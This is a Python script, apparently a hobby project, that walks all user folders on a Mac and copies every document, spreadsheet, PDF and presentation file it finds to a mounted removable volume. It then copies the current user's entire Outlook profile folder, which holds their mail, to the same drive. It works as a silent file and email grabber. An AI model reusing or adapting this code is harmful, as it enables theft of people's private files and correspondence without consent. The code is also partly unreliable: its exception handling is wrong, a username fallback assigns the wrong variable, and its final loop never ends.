#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Mar 30 11:29:43 2021

@author: aronj23
"""
import os
import shutil
import time as t
global Fin

Fin = False
StartTime = t.time()

fileext = [
    ".xls", ".pdf", ".csv", ".ods",   # Excel data files alongside pdf
    ".pptx", ".pptm", ".ppt", ".ppsx", ".ppsm", ".pps", ".odp"]  # Powerpoint files
CurPath = r"/Volumes/93ef6413/"  # Set the path that we are dropping files to


FilesTR = []
# This code thanks to "shadow0359"
for root, dirs, files in os.walk("/Users", topdown=False):  # For every directory, file and root in the users directory:
    for name in files:  # For every file that has a name:
        FilesTR += [os.path.join(root, name)]  # Append the file name and path to the files list

print("Finished getting raw files at: " + str(t.time() - StartTime))

valid = []
x = (len(FilesTR) - 1)  # Create variable that is 1 less than num. of items in list of all files
while x >= 0:  # While x is less than or equal to 0
    for item in fileext:  # For every file extension in the list of wanted ones
        if item in FilesTR[x]:  # Take that item and check if it is in the list of all files
            valid.append(FilesTR[x])  # Append it to a new list
    x = x - 1  # subtract 1 from x, to move onto the next item in the list of all files.

# Doing this is about 100x faster than going:
# if ".pdf" in FilesTR or ".xls" in FilesTR [AND SO ON]

valid = list(dict.fromkeys(valid))
# Convert the list to a dictionary, as dicts cannot have duplicate values (thanks to W3 schools!)
print(str(len(valid)))
print("Finished filtering files at: " + str(t.time() - StartTime))


y = 0  # Debug variable to store number of errors in copying files
x = 0  

for item in valid:  # For every item in the valid list.
    try:  # Try and do the following
        shutil.copyfile(item, CurPath + r'FindFiles/' + str(x) + item.split("/")[int(len(item.split("/")) - 1)])
    except shutil.SameFileError or OSError:  # Except for if there is an error copying the file
        print(valid[x])  # Print the item that caused an error
        y += 1  # Add 1 to the total amount of errors
    x += 1
print("Finished copying files at: " + str(t.time() - StartTime))
# Now we start doing our specific files

try:
    # The below function is thanks to stackoverflow user atzz. Question was asked by Daryl Spitzer
    def copytree(src, dst, symlinks=False, ignore=None):
        for item in os.listdir(src):
            s = os.path.join(src, item)
            d = os.path.join(dst, item)
            if os.path.isdir(s):
                shutil.copytree(s, d, symlinks, ignore)
            else:
                shutil.copy2(s, d)

    suc = False
    try:
        envi = os.environ['LOGNAME']  # Get the users name
        suc = True
    except KeyError:  # If we can't get the username by the previous method
        try:
            print("Couldn't find the LOGNAME key...\nLet me try using getpass")
            import getpass as gp
            envi = gp.getuser()  # This was thanks to user Konstantin Tenzin on stackoverflow
            suc = True
        except Exception:  # We shouldn't really ever get past this...
            print("One last try!")
            try:
                import pwd  # This answer thanks to Grzegorz Skibinski on stackoverflow.
                penvi = pwd.getpwuid(os.getuid())[0]
                suc = True
            except KeyError:
                suc = False

    if suc:
        copytree(r"/Users/" + envi + r"/Library/Group Containers/UBF8T346G9.Office/Outlook/Outlook 15 Profiles", CurPath + r"Outlook/")
except KeyboardInterrupt:
    Fin = True
while not Fin:
    t.sleep(1)
FinTime = t.time()
print("This took: " + str(FinTime - StartTime) + " seconds!")
